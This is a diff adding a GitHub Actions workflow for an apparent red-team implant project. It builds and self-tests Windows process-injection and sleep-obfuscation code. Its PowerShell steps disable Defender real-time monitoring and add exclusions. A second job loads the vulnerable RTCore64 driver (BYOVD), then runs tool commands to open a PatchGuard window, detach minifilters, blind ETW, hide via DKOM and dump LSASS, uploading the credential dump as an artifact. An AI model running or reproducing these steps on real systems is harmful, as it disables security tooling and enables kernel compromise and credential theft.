@@ -1,0 +1,193 @@
+name: P4-P5 Real-machine Validation
+
+# P4 (Foliage APC) + P5 (Pool Party) + kernelsdk BYOVD regression on hosted
+# Windows runners.  Manual trigger conserves minutes; PR trigger on implant
+# changes catches regressions before merge.  See docs/P4_P5_VALIDATION_STRATEGY.md.
+#
+# Authorized red-team security research project.
+
+on:
+  workflow_dispatch:       # manual trigger (saves minutes)
+  pull_request:
+    paths:
+      - 'crates/implant-win/**'
+      - '.github/workflows/p4-p5-validate.yml'
+
+concurrency:
+  group: p4-p5-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  # ==========================================================================
+  # userland-validation — P4 (Foliage APC) + P5 (Pool Party) user-mode selftests
+  # ==========================================================================
+  userland-validation:
+    runs-on: windows-latest   # Server 2022, Defender disabled by default
+    timeout-minutes: 20       # Windows 2x multiplier — caps burn
+    env:
+      # Arm P4/P5 research gates at build time so the selftest paths fire.
+      NYX_FOLIAGE_APC_ON: "1"
+      NYX_POOL_PARTY_ON: "1"
+      RUSTFLAGS: "-C link-arg=-Wl,--gc-sections"
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # -- 1. Double-insurance: confirm Defender is off + add exclusions ---------
+      - name: Disable Defender + add exclusions
+        shell: powershell
+        run: |
+          # Confirm the image default
+          $pref = (Get-MpPreference).DisableRealtimeMonitoring
+          Write-Host "Defender realtime disabled (image default): $pref"
+          # Double-insurance: re-disable + exclude workspace and toolchain
+          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE\target" -Force -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionProcess "cargo.exe","nyx-selftest-foliage-apc.exe","nyx-inject-test.exe" -Force -ErrorAction SilentlyContinue
+          # Verify
+          $now = (Get-MpPreference).DisableRealtimeMonitoring
+          Write-Host "Defender realtime disabled (after step): $now"
+
+      # -- 2. Toolchain: stable + nightly + Windows GNU target ------------------
+      - name: Install Rust stable
+        uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: x86_64-pc-windows-gnu
+
+      - name: Install Rust nightly (implant requires nightly + rust-src)
+        uses: dtolnay/rust-toolchain@nightly
+        with:
+          components: rust-src
+
+      - name: Install mingw-w64
+        shell: pwsh
+        run: choco install mingw -y --no-progress
+
+      # -- 3. Build implant with P4/P5 gates ON ---------------------------------
+      - name: Build implant with P4/P5 gates ON
+        shell: bash
+        run: |
+          cargo +nightly build --release --target x86_64-pc-windows-gnu --manifest-path crates/implant-win/Cargo.toml
+
+      # -- 4. P4 Foliage data-only baseline (safe — no .text encryption) --------
+      - name: P4 baseline — foliage data-only
+        shell: pwsh
+        run: |
+          $env:RUST_BACKTRACE = "full"
+          cargo +nightly test --target x86_64-pc-windows-gnu --manifest-path crates/implant-win/Cargo.toml --lib -- foliage_data_only --nocapture
+
+      # -- 5. P4 Foliage APC with PIC thunk wired (exercises .text RC4 encryption) -
+      - name: P4 thunk — foliage_apc (thunk wired)
+        shell: pwsh
+        run: |
+          $env:RUST_BACKTRACE = "full"
+          cargo +nightly test --target x86_64-pc-windows-gnu --manifest-path crates/implant-win/Cargo.toml --lib -- foliage_apc --nocapture
+
+      # -- 6. P5 Pool Party section delivery to self ----------------------------
+      - name: P5 — inject_pool section delivery
+        shell: pwsh
+        run: |
+          cargo +nightly test --target x86_64-pc-windows-gnu --manifest-path crates/implant-win/Cargo.toml --lib -- inject_pool --nocapture
+
+      # -- 7. Upload selftest logs / dumps --------------------------------------
+      - name: Upload selftest logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: p4-p5-selftest-logs
+          path: |
+            target/*/release/*.log
+            target/*/release/*.dmp
+
+  # ==========================================================================
+  # kernelsdk-byovd — kernelsdk BYOVD regression (only if HVCI is OFF)
+  # ==========================================================================
+  # On hosted runners CodeIntegrityPolicyEnforcementStatus=2, so BYOVD cannot
+  # load.  This job probes HVCI and skips when enforcement is on.  When a
+  # self-hosted runner with HVCI off is attached, the full BYOVD path runs.
+  kernelsdk-byovd:
+    runs-on: windows-latest
+    timeout-minutes: 15
+    continue-on-error: true   # HVCI on → skip, don't fail the workflow
+    steps:
+      - uses: actions/checkout@v4
+
+      # -- 0. Probe HVCI + vulnerable driver blocklist status -------------------
+      - name: Probe HVCI + vulnerable driver blocklist status
+        id: hvci_probe
+        shell: powershell
+        run: |
+          Write-Host "=== Win32_DeviceGuard / VBS / HVCI status ==="
+          $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+          $dg | Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus | Format-List
+          Write-Host "=== Vulnerable Driver Blocklist registry ==="
+          $bl = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config' -ErrorAction SilentlyContinue).VulnerableDriverBlocklistEnable
+          Write-Host "VulnerableDriverBlocklistEnable = $bl (1=on, 0=off, empty=not set)"
+          # CI policy enforced (CodeIntegrityPolicyEnforcementStatus=2) → BYOVD blocked
+          $ci_enforced = ($dg.CodeIntegrityPolicyEnforcementStatus -eq 2)
+          $hvci_running = ($dg.SecurityServicesRunning -contains 2)
+          Write-Host "HVCI actively running: $hvci_running"
+          Write-Host "CI policy enforced: $ci_enforced"
+          if ($ci_enforced -or $hvci_running) {
+            Write-Host "::warning::HVCI/CI policy is enforcing — BYOVD (RTCore64) load will be blocked. Skipping kernelsdk job."
+            echo "skip=true" >> $env:GITHUB_OUTPUT
+          } else {
+            Write-Host "::notice::HVCI NOT running + CI policy NOT enforced — BYOVD load should succeed."
+            echo "skip=false" >> $env:GITHUB_OUTPUT
+          }
+
+      - name: Skip — HVCI/CI policy blocks BYOVD
+        if: steps.hvci_probe.outputs.skip == 'true'
+        run: echo "Skipped kernelsdk BYOVD job (HVCI/CI policy is enforcing)."
+
+      # -- 1-3. Only execute when HVCI is OFF ----------------------------------
+      - name: Disable Defender
+        if: steps.hvci_probe.outputs.skip == 'false'
+        shell: powershell
+        run: |
+          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:GITHUB_WORKSPACE" -Force -ErrorAction SilentlyContinue
+
+      - name: Install Rust stable
+        if: steps.hvci_probe.outputs.skip == 'false'
+        uses: dtolnay/rust-toolchain@stable
+
+      - name: Build operator-kernel-cli
+        if: steps.hvci_probe.outputs.skip == 'false'
+        run: cargo build --release --manifest-path crates/operator-kernel-cli/Cargo.toml
+
+      # -- 4. BYOVD real-machine regression (Task G-K + P0.a/b + P3.b) --------
+      - name: kernelsdk BYOVD real-machine regression
+        if: steps.hvci_probe.outputs.skip == 'false'
+        shell: pwsh
+        run: |
+          # RTCore64.sys is .gitignore excluded — must be pre-provisioned.
+          $driverPath = "$env:GITHUB_WORKSPACE\tools\RTCore64.sys"
+          if (-not (Test-Path $driverPath)) {
+            Write-Host "::warning::RTCore64.sys not found at $driverPath — skipping BYOVD load."
+            return
+          }
+          # Bootstrap (KslD → BYOVD fallback)
+          .\target\release\nyx-kernel.exe bootstrap --byovd $driverPath NyaRTCore
+          if ($LASTEXITCODE -ne 0) { throw "bootstrap failed (exit $LASTEXITCODE)" }
+          # P0.a — PatchGuard window
+          .\target\release\nyx-kernel.exe pg-window
+          # P0.b — MiniFilter detach (build table auto-fallback)
+          .\target\release\nyx-kernel.exe detach-minifilter
+          # ETW-TI blind + DKOM hide + LSASS dump
+          .\target\release\nyx-kernel.exe blind-etw
+          $lsassPid = (Get-Process lsass).Id
+          .\target\release\nyx-kernel.exe dump-lsass $lsassPid
+          Write-Host "::notice::kernelsdk BYOVD full path passed (Task G-K + P0.a/b + P3.b)"
+
+      - name: Upload kernel logs + LSASS dump
+        if: always() && steps.hvci_probe.outputs.skip == 'false'
+        uses: actions/upload-artifact@v4
+        with:
+          name: kernelsdk-byovd-logs
+          path: |
+            lsass_*.dmp
+            target/release/*.log
